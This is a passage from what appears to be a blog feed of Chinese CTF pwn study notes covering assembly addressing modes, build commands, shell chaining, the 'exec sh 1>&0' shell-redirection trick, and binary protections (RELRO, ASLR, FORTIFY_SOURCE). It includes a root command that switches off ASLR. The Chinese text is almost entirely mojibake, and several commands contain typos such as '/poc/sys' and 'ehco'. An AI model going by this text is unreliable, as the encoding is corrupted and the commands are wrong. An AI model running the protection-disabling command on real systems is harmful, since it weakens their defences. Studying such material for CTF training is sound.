æ¯”æˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒã€‚<br>00401000âˆ¶æ­¤å¤„è¡¨ç¤ºå†…å­˜ä¸­çš„è™šæ‹Ÿåœ°å€ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒåŒä¸€ä¸ªç¨‹åºçš„å‘ä¸€æ¡æŒ‡ä»¤åœ¨ä¸åŒç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œæ­¤å€¼ç›¸åŒï¼ˆPEæ˜ å°„åŸç†ï¼‰ã€‚</p><h3 id="åŸºåœ°å€ï¼ˆ-ImageBase"><a href="#åŸºåœ°å€ï¼ˆ-ImageBase" class="headerlink" title="åŸºåœ°å€ï¼ˆ ImageBase)"></a><strong>åŸºåœ°å€ï¼ˆ ImageBase)</strong></h3><p>æ–‡ä»¶æ‰§è¡Œæ—¶å°†è¢«æ˜ å°„åˆ°æŒ‡å®šå†…å­˜åœ°å€ä¸­Â·è¿™ä¸ªåˆå§‹å†…å­˜åœ°å€ç§°ä¸ºåŸºåœ°å€ã€‚è¿™ä¸ªå€¼æ˜¯ç”±PEæ–‡ä»¶æœ¬èº«è®¾å®šçš„ã€‚<br>æ§ç…§é»˜è®¤è®¾ç½®Â·ç”¨Visual C++å»ºç«‹çš„EXEæ–‡ä»¶åŸºåœ°å€æ˜¯00400000hã€‚DLLæ”¯ä»¶åŸºåœ°å€æ˜¯10000000hã€‚ä½†è¿™ä¸ªå€¼å¯è‡ªå·±åœ¨ç¼–è¯‘å™¨è®¾å®šçš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è’è¯</title>
      <link href="/2023/08/27/%E8%8D%92%E8%AF%9E/"/>
      <url>/2023/08/27/%E8%8D%92%E8%AF%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="yubâ€˜s-blog"><a href="#yubâ€˜s-blog" class="headerlink" title="yubâ€˜s blog"></a>yubâ€˜s blog</h2><p>å‘ç€å½©è™¹æµ·å‡ºå‘ï¼</p><p><img src="/../imgs/1.jpg" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> ç¢ç‰‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hot Time Exercising Records</title>
      <link href="/2022/11/08/Hot%20Time%20Exercising%20Records/"/>
      <url>/2022/11/08/Hot%20Time%20Exercising%20Records/</url>
      
        <content type="html"><![CDATA[<h1 id="Hot-Time-Exercising-Records"><a href="#Hot-Time-Exercising-Records" class="headerlink" title="Hot Time Exercising Records"></a>Hot Time Exercising Records</h1><h4 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h4><p>ç³»ç»Ÿè°ƒç”¨å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; ç«‹å³å¯»å€æ–¹å¼</span><br><span class="line">    mov eax, 11         ; å°†11èµ‹å€¼ç»™eax</span><br><span class="line">    add eax, 114504     ; eaxåŠ ä¸Š114504</span><br><span class="line">    sub eax, 1          ; eaxå‡å»1</span><br><span class="line"></span><br><span class="line">; å¯„å­˜å™¨å¯»å€æ–¹å¼</span><br><span class="line">    mov ebx, 0x36d      ; å°†0x36dèµ‹å€¼ç»™ebx</span><br><span class="line">    mov edx, ebx        ; å°†ebxçš„å€¼èµ‹å€¼ç»™edx</span><br><span class="line"></span><br><span class="line">; ç›´æ¥å¯»å€æ–¹å¼</span><br><span class="line">    mov ecx, [msg]      ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span><br><span class="line"></span><br><span class="line">; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼</span><br><span class="line">    mov esi, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi</span><br><span class="line">    mov eax, [esi]      ; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span><br><span class="line"></span><br><span class="line">; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼</span><br><span class="line">    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span><br><span class="line">    add ecx, 4          ; å°†ecxåŠ ä¸Š4</span><br><span class="line">    mov eax, [ecx]      ; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span><br><span class="line"></span><br><span class="line">; åŸºå€å˜å€å¯»å€æ–¹å¼</span><br><span class="line">    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span><br><span class="line">    mov edx, 2          ; å°†2èµ‹å€¼ç»™edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span><br><span class="line"></span><br><span class="line">; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼</span><br><span class="line">    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span><br><span class="line">    mov edx, 1          ; å°†1èµ‹å€¼ç»™edx</span><br><span class="line">    add ecx, 8          ; å°†ecxåŠ ä¸Š8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span><br><span class="line"></span><br><span class="line">; è¾“å‡ºå­—ç¬¦ä¸²</span><br><span class="line">    mov eax, 4          ; ç³»ç»Ÿè°ƒç”¨å·4ä»£è¡¨è¾“å‡ºå­—ç¬¦ä¸²</span><br><span class="line">    mov ebx, 1          ; æ–‡ä»¶æè¿°ç¬¦1ä»£è¡¨æ ‡å‡†è¾“å‡º</span><br><span class="line">    mov ecx, msg        ; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€</span><br><span class="line">    mov edx, 22         ; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦</span><br><span class="line">    int 0x80            ; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</span><br><span class="line"></span><br><span class="line">; é€€å‡ºç¨‹åº</span><br><span class="line">    mov eax, 1          ; ç³»ç»Ÿè°ƒç”¨å·1ä»£è¡¨é€€å‡ºç¨‹åº</span><br><span class="line">    xor ebx, ebx        ; è¿”å›å€¼ä¸º0</span><br><span class="line">    int 0x80            ; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</span><br></pre></td></tr></table></figure><p>ELFæ–‡ä»¶ç¼–è¯‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf flag.asm -o flag.o<span class="regexp">//</span>ç”Ÿæˆflag.oæ–‡ä»¶</span><br><span class="line">ld -m elf_i386 -o flag flag.o<span class="regexp">//</span>ä½¿ç”¨ldå‘½ä»¤å°†flag.oæ–‡ä»¶ä½¿ç”¨<span class="number">32</span>ä½x86æ¶æ„é“¾æ¥ä¸ºflag</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šç¼–è¯‘å’Œæ‰§è¡Œæ±‡ç¼–ä»£ç å¯èƒ½ä¾èµ–äºæ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿå’Œä½“ç³»ç»“æ„ï¼Œä¸Šè¿°æ­¥éª¤é€‚ç”¨äºä½¿ç”¨ NASM æ±‡ç¼–å™¨å’Œ ld é“¾æ¥å™¨çš„ 32 ä½ x86 ç³»ç»Ÿã€‚æ ¹æ®ç¯å¢ƒç›¸åº”åœ°è°ƒæ•´ç¼–è¯‘å’Œé“¾æ¥çš„å‘½ä»¤ã€‚</p><p>.cæ–‡ä»¶ç¼–è¯‘</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc flag.<span class="keyword">c</span> -o flag</span><br></pre></td></tr></table></figure><p>å«keyæ–‡ä»¶ç¼–è¯‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;the_key&quot;</span>&gt;key<span class="regexp">//</span>ç”Ÿæˆå†™å…¥å†…å®¹çš„keyæ–‡ä»¶</span><br><span class="line">gcc flag.c -o flag</span><br></pre></td></tr></table></figure><p>.sæ–‡ä»¶ç¼–è¯‘</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gcc</span> flag.s -o flag</span><br></pre></td></tr></table></figure><p>.s æ–‡ä»¶æ˜¯æ±‡ç¼–è¯­è¨€æºæ–‡ä»¶çš„ä¸€ç§å¸¸è§æ‰©å±•åã€‚å®ƒåŒ…å«äº†ä½¿ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™çš„ç¨‹åºä»£ç ã€‚æ±‡ç¼–è¯­è¨€ æ˜¯ä¸€ç§ä½çº§ç¼–ç¨‹è¯­è¨€ï¼Œç”¨äºç›´æ¥æ“ä½œè®¡ç®—æœºçš„æŒ‡ä»¤é›†æ¶æ„ã€‚ .s æ–‡ä»¶é€šå¸¸ç”±æ±‡ç¼–å™¨ï¼ˆAssemblerï¼‰å¤„ ç†ï¼Œå°†å…¶è½¬æ¢ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æˆ–ç›®æ ‡æ–‡ä»¶ã€‚</p><p>å½“ä½¿ç”¨åˆ†å·ï¼ˆ ; ï¼‰å°†å‘½ä»¤è¿æ¥åœ¨ä¸€èµ·æ—¶ï¼Œå®ƒä»¬æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºé€ä¸ªæ‰§è¡Œï¼Œæ— è®ºå‰é¢çš„å‘½ä»¤æ˜¯å¦ æˆåŠŸã€‚è¿™æ„å‘³ç€æ— è®ºå‰ä¸€ä¸ªå‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œï¼Œåç»­çš„å‘½ä»¤éƒ½å°†è¢«æ‰§è¡Œã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comma<span class="symbol">nd1</span> ; comma<span class="symbol">nd2</span> ; comma<span class="symbol">nd3</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ command1 æ‰§è¡Œå®Œæ¯•åï¼Œæ— è®ºæˆåŠŸä¸å¦ï¼Œæ¥ç€ä¼šæ‰§è¡Œ command2 ï¼Œç„¶åå†æ‰§è¡Œ command3 ã€‚è¿™æ ·ï¼Œå¤šä¸ªå‘½ä»¤å¯ä»¥æŒ‰é¡ºåºåœ¨ä¸€è¡Œä¸Šæ‰§è¡Œã€‚ æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨ &amp; å°†ä¸¤æ¡å‘½ä»¤æ‹¼æ¥åœ¨ä¸€èµ·å¯ä»¥å®ç°å¹¶è¡Œæ‰§è¡Œï¼Œå³è¿™ä¸¤æ¡å‘½ä»¤å°†åŒæ—¶åœ¨åå°æ‰§è¡Œã€‚å‘½ ä»¤ä¹‹é—´ä½¿ç”¨ &amp; è¿›è¡Œåˆ†éš”,è¿™ç§æ–¹å¼ä¸‹å‘½ä»¤çš„è¾“å‡ºå¯èƒ½ä¼šç›¸äº’æ··åˆï¼Œå…·ä½“çš„è¾“å‡ºé¡ºåºå–å†³äºå‘½ä»¤çš„æ‰§è¡Œé€Ÿåº¦å’Œç³»ç»Ÿèµ„æºã€‚</p><p><strong>çœŸçœŸå‡å‡ï¼ŒçœŸäº¦çœŸï¼Œå‡äº¦å‡</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;&gt;/ctfshow_flag&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤å°†å­—ç¬¦ä¸² â€˜flag is hereâ€™ è¿½åŠ å†™å…¥ &#x2F;ctfshow_flag æ–‡ä»¶ä¸­ã€‚ <strong>&gt;&gt; ç¬¦å·è¡¨ç¤ºä»¥è¿½åŠ çš„æ–¹å¼å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚</strong>å¦‚æœ &#x2F;ctfshow_flag æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ ä¹ˆè¯¥å‘½ä»¤ä¼šåœ¨æ–‡ä»¶çš„æœ«å°¾æ·»åŠ  â€˜flag is hereâ€™ ã€‚</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;/ctfshow_flag&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p> è¿™ä¸ªå‘½ä»¤å°†å­—ç¬¦ä¸² â€˜flag is hereâ€™ è¦†ç›–å†™å…¥ &#x2F;ctfshow_flag æ–‡ä»¶ä¸­ã€‚ <strong>&gt; ç¬¦å·è¡¨ç¤ºä»¥è¦†ç›– çš„æ–¹å¼å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚</strong>å¦‚æœ &#x2F;ctfshow_flag æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆ è¯¥å‘½ä»¤ä¼šå°†æ–‡ä»¶ä¸­åŸæœ‰çš„å†…å®¹æ›¿æ¢ä¸º â€˜flag is hereâ€™ ã€‚ è¿™ä¸¤ä¸ªå‘½ä»¤éƒ½ç”¨äºå°† â€˜flag is hereâ€™ å†™å…¥ &#x2F;ctfshow_flag æ–‡ä»¶ä¸­ï¼Œä¸åŒä¹‹å¤„åœ¨äºå†™å…¥æ–¹å¼çš„ä¸ åŒã€‚ç¬¬ä¸€ä¸ªå‘½ä»¤ä½¿ç”¨è¿½åŠ æ–¹å¼ï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ å†…å®¹ï¼›ç¬¬äºŒä¸ªå‘½ä»¤ä½¿ç”¨è¦†ç›–æ–¹å¼ï¼Œå°†æ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºæ–° å†…å®¹ã€‚å…·ä½“ä½¿ç”¨å“ªä¸ªå‘½ä»¤å–å†³äºéœ€æ±‚å’Œæ–‡ä»¶æ“ä½œçš„é¢„æœŸç»“æœã€‚</p><p>ä½¿ç”¨äº† exec å‡½æ•°æ¥æ‰§è¡Œ sh å‘½ä»¤ï¼Œå¹¶ä½¿ç”¨ 1&gt;&amp;0 æ¥è¿›è¡Œè¾“å‡ºé‡å®šå‘ã€‚è¿™ä¸ªå‘½ä»¤å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œå®é™…ä¸Šå°±æ˜¯å°†å‘½ä»¤çš„è¾“å‡ºå‘é€åˆ°åç»­å‘½ä»¤çš„è¾“å…¥ã€‚ å…·ä½“æ¥è¯´ï¼Œ 1&gt;&amp;0 ä¸­çš„ 1 è¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼Œ 0 è¡¨ç¤ºæ ‡å‡†è¾“å…¥ã€‚é€šè¿‡å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œå¯ ä»¥å®ç°å°†å‘½ä»¤çš„è¾“å‡ºä½œä¸ºåç»­å‘½ä»¤çš„è¾“å…¥ã€‚è¿™æ ·å¯ä»¥åœ¨æ‰§è¡Œ sh å‘½ä»¤åï¼Œè¿›å…¥ä¸€ä¸ªäº¤äº’å¼çš„Shellç¯å¢ƒï¼Œ å¯ä»¥åœ¨è¯¥ç¯å¢ƒä¸­æ‰§è¡Œå‘½ä»¤å¹¶ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚</p><p><strong>RELROä»‹ç»</strong></p><p>RELROï¼ˆRELocation Read-Onlyï¼‰æ˜¯ä¸€ç§å¯é€‰çš„äºŒè¿›åˆ¶ä¿æŠ¤æœºåˆ¶ï¼Œç”¨äºå¢åŠ ç¨‹åºçš„å®‰å…¨æ€§ã€‚å®ƒä¸»è¦ é€šè¿‡é™åˆ¶å’Œä¿æŠ¤å…¨å±€åç§»è¡¨ï¼ˆGlobal Offset Tableï¼Œç®€ç§° GOTï¼‰å’Œè¿‡ç¨‹é“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼Œç®€ç§° PLTï¼‰çš„å¯å†™æ€§æ¥é˜²æ­¢é’ˆå¯¹è¿™äº›ç»“æ„çš„æ”»å‡»ã€‚ </p><p>RELROä¿æŠ¤æœ‰ä¸‰ç§çŠ¶æ€ï¼š </p><ol><li><p>No RELROï¼šåœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œ<strong>GOTå’ŒPLTéƒ½æ˜¯å¯å†™</strong>çš„ï¼Œæ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¿®æ”¹è¿™äº›è¡¨ä¸­çš„æŒ‡ é’ˆï¼Œä»è€Œè¿›è¡Œæ”»å‡»ã€‚è¿™æ˜¯æœ€å¼±çš„ä¿æŠ¤çŠ¶æ€ã€‚</p></li><li><p>Partial RELROï¼šåœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œ<strong>GOTçš„å¼€å¤´éƒ¨åˆ†</strong>è¢«è®¾ç½®ä¸º<strong>åªè¯»</strong>ï¼ˆROï¼‰ï¼Œè€Œ<strong>å‰©ä½™éƒ¨åˆ†ä»ç„¶å¯å†™</strong>ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢ä¸€äº›ç®€å•çš„æ”»å‡»ï¼Œä½†ä»å­˜åœ¨ä¸€äº›æ¼æ´ã€‚</p></li><li><p>Full RELROï¼šåœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œ<strong>GOTå’ŒPLTéƒ½è¢«è®¾ç½®ä¸ºåªè¯»</strong>ï¼ˆROï¼‰ã€‚è¿™æ ·åšå¯ä»¥é˜²æ­¢å¯¹è¿™äº›ç»“æ„çš„ä¿®æ”¹ï¼Œæä¾›æ›´å¼ºçš„ä¿æŠ¤ã€‚ä»»ä½•å¯¹è¿™äº›è¡¨çš„ä¿®æ”¹éƒ½ä¼šå¯¼è‡´ç¨‹åºå¼‚å¸¸ç»ˆæ­¢ã€‚</p></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile -S pwn<span class="regexp">//</span>æŸ¥è¡¨é¡¹åœ°å€</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R pwn<span class="regexp">//</span>æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„åŠ¨æ€é“¾æ¥å‘½ä»¤</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -l pwn<span class="regexp">//</span>æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«åº“çš„ELFå¤´å’Œç¨‹åºå¤´è¡¨ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><strong>ä¿æŠ¤å¡</strong></p><p>ASLRï¼ˆAddress Space Layout Randomizationï¼‰æ˜¯ä¸€ç§æ“ä½œç³»ç»Ÿçº§åˆ«çš„å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œæ—¨åœ¨å¢åŠ  è½¯ä»¶ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚å®ƒé€šè¿‡éšæœºåŒ–ç¨‹åºåœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼Œä½¿å¾—æ”»å‡»è€…éš¾ä»¥å‡†ç¡®åœ°ç¡®å®šå…³é”®ä»£ç å’Œæ•°æ®çš„ ä½ç½®ï¼Œä»è€Œå¢åŠ äº†åˆ©ç”¨è½¯ä»¶æ¼æ´è¿›è¡Œæ”»å‡»çš„éš¾åº¦ã€‚ </p><p>å¼€å¯ä¸åŒç­‰çº§ä¼šæœ‰ä¸åŒçš„æ•ˆæœï¼š </p><ol><li><strong>å†…å­˜å¸ƒå±€éšæœºåŒ–</strong>ï¼š ASLRçš„ä¸»è¦ç›®æ ‡æ˜¯éšæœºåŒ–ç¨‹åºçš„å†…å­˜å¸ƒå±€ã€‚åœ¨ä¼ ç»Ÿçš„å†…å­˜å¸ƒå±€ä¸­ï¼Œä¸åŒçš„ åº“å’Œæ¨¡å—é€šå¸¸ä¼šåœ¨å›ºå®šçš„å†…å­˜ä½ç½®ä¸ŠåŠ è½½ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§å¯é¢„æµ‹æ€§æ¥å®šä½å’Œåˆ©ç”¨æ¼æ´ã€‚ ASLRé€šè¿‡éšæœºåŒ–è¿™äº›æ¨¡å—çš„åŠ è½½åœ°å€ï¼Œä½¿å¾—æ”»å‡»è€…æ— æ³•å‡†ç¡®åœ°ç¡®å®šå†…å­˜ä¸­çš„å…³é”®æ•°æ®ç»“æ„å’Œ ä»£ç çš„ä½ç½®ã€‚ </li><li><strong>åœ°å€ç©ºé—´èŒƒå›´çš„éšæœºåŒ–</strong>ï¼š ASLRè¿˜ä¼šéšæœºåŒ–è¿›ç¨‹çš„åœ°å€ç©ºé—´èŒƒå›´ã€‚åœ¨ä¼ ç»Ÿçš„åœ°å€ç©ºé—´ä¸­ï¼Œæ ˆã€ å †ã€ä»£ç æ®µå’Œæ•°æ®æ®µé€šå¸¸ä¼šè¢«åˆ†é…åˆ°å›ºå®šçš„åœ°å€èŒƒå›´ä¸­ã€‚ASLRä¼šéšæœºé€‰æ‹©åœ°å€ç©ºé—´çš„èµ·å§‹ä½ ç½®å’Œå¤§å°ï¼Œä»è€Œä½¿å¾—è¿™äº›é‡è¦çš„å†…å­˜åŒºåŸŸåœ¨æ¯æ¬¡è¿è¡Œæ—¶éƒ½æœ‰ä¸åŒçš„ä½ç½®ã€‚</li><li><strong>éšæœºåç§»é‡</strong>ï¼š ASLRä¼šå¼•å…¥éšæœºåç§»é‡ï¼Œå°†ç¨‹åºå’Œæ¨¡å—åœ¨å†…å­˜ä¸­çš„ç›¸å¯¹ä½ç½®éšæœºåŒ–ã€‚è¿™æ„å‘³ç€ æ¯ä¸ªæ¨¡å—çš„å®é™…åœ°å€æ˜¯ç›¸å¯¹äºä¸€ä¸ªéšæœºåŸºå€åç§»çš„ï¼Œè€Œä¸æ˜¯ç»å¯¹åœ°å€ã€‚æ”»å‡»è€…éœ€è¦åœ¨è¿è¡Œæ—¶å‘ ç°è¿™äº›åç§»é‡ï¼Œæ‰èƒ½å‡†ç¡®åœ°å®šä½å’Œåˆ©ç”¨æ¼æ´ã€‚</li><li><strong>å †å’Œæ ˆéšæœºåŒ–</strong>ï¼š ASLRä¹Ÿä¼šå¯¹å †å’Œæ ˆè¿›è¡ŒéšæœºåŒ–ã€‚å †éšæœºåŒ–ä¼šåœ¨æ¯æ¬¡åˆ†é…å†…å­˜æ—¶é€‰æ‹©ä¸åŒçš„èµ· å§‹åœ°å€ï¼Œä½¿å¾—æ”»å‡»è€…æ— æ³•å‡†ç¡®åœ°é¢„æµ‹å †ä¸Šå¯¹è±¡çš„ä½ç½®ã€‚æ ˆéšæœºåŒ–ä¼šéšæœºé€‰æ‹©æ ˆå¸§çš„èµ·å§‹ä½ç½®ï¼Œ ä½¿å¾—æ”»å‡»è€…æ— æ³•è½»æ˜“åœ°è¦†ç›–è¿”å›åœ°å€æˆ–æ§åˆ¶ç¨‹åºæµç¨‹ã€‚ ALSRå…¨å±€é…ç½®&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spaceæœ‰ä¸‰ç§æƒ…å†µï¼š 0è¡¨ç¤ºå…³é—­ALSR 1è¡¨ç¤ºéƒ¨åˆ†å¼€å¯ï¼ˆå°†mmapçš„åŸºå€ã€stackå’Œvdsoé¡µé¢éšæœºåŒ–ï¼‰ 2è¡¨ç¤ºå®Œå…¨å¼€å¯</li></ol><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230706231549588.png" alt="image-20230706231549588"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  <span class="regexp">/poc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space<span class="regexp">//</span>æŸ¥çœ‹alsr</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>sudo suè¿›å…¥rootæ¨¡å¼å <span class="regexp">//</span>ehco <span class="number">0</span> &gt; <span class="regexp">/poc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space<span class="regexp">//</span>å…³é—­alsr</span><br></pre></td></tr></table></figure><p>FORTIFY_SOURCE</p><p>FORTIFY_SOURCE æ˜¯ä¸€ä¸ª C&#x2F;C++ ç¼–è¯‘å™¨æä¾›çš„å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œæ—¨åœ¨é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºå’Œå…¶ä»–ä¸å­—ç¬¦ ä¸²å’Œå†…å­˜æ“ä½œç›¸å…³çš„å®‰å…¨æ¼æ´ã€‚å®ƒæ˜¯åœ¨ç¼–è¯‘æ—¶è‡ªåŠ¨æ’å…¥çš„ä¸€ç»„é¢å¤–ä»£ç ï¼Œç”¨äºå¢å¼ºç¨‹åºå¯¹äºç¼“å†²åŒºæº¢å‡º å’Œå…¶ä»–å¸¸è§å®‰å…¨é—®é¢˜çš„é˜²æŠ¤ã€‚</p><p> FORTIFY_SOURCE æä¾›äº†ä»¥ä¸‹ä¸»è¦åŠŸèƒ½ï¼š</p><ol><li><strong>è¿è¡Œæ—¶é•¿åº¦æ£€æŸ¥</strong>ï¼šFORTIFY_SOURCE ä¼šåœ¨ç¼–è¯‘æ—¶è‡ªåŠ¨å°†é•¿åº¦æ£€æŸ¥ä»£ç æ’å…¥åˆ°ä¸€äº›å±é™©çš„åº“å‡½æ•°ä¸­ï¼Œä¾‹å¦‚ strcpy ã€ strcat ã€ sprintf ç­‰ã€‚è¿™äº›ä»£ç ä¼šæ£€æŸ¥ç›®æ ‡ç¼“å†²åŒºçš„é•¿åº¦ï¼Œä»¥ç¡®ä¿æ“ä½œä¸ä¼šå¯¼è‡´æº¢å‡ºã€‚å¦‚æœæ£€æµ‹åˆ°æº¢å‡ºæƒ…å†µï¼Œç¨‹åºä¼šç«‹å³ç»ˆæ­¢ï¼Œä»è€Œé˜²æ­¢æ½œåœ¨çš„æ¼æ´åˆ©ç”¨ã€‚</li><li><strong>ç¼“å†²åŒºæº¢å‡ºæ£€æµ‹</strong>ï¼šFORTIFY_SOURCE è¿˜ä¼šå°†é¢å¤–çš„ä¿æŠ¤æœºåˆ¶æ·»åŠ åˆ°ä¸€äº›æ•æ„Ÿçš„åº“å‡½æ•°ä¸­ï¼Œä¾‹å¦‚ memcpy ã€ memmove ã€ memset ç­‰ã€‚è¿™äº›æœºåˆ¶å¯ä»¥æ£€æµ‹ä¼ é€’ç»™è¿™äº›å‡½æ•°çš„æºå’Œç›®æ ‡ç¼“å†²åŒºæ˜¯å¦æœ‰é‡å ï¼Œå¹¶é˜²æ­¢æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºã€‚ </li><li><strong>å®‰å…¨è­¦å‘Šå’Œé”™è¯¯æŠ¥å‘Š</strong>ï¼šå½“ FORTIFY_SOURCE 